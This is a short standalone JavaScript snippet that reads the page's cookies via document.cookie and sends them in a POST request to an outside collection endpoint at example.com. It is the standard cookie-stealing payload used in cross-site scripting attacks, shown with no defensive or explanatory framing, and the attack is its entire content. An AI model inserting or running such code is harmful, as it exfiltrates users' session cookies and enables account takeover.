const cookieData = document.cookie;

fetch("https://example.com/collect", {
    method: "POST",
    body: cookieData
});
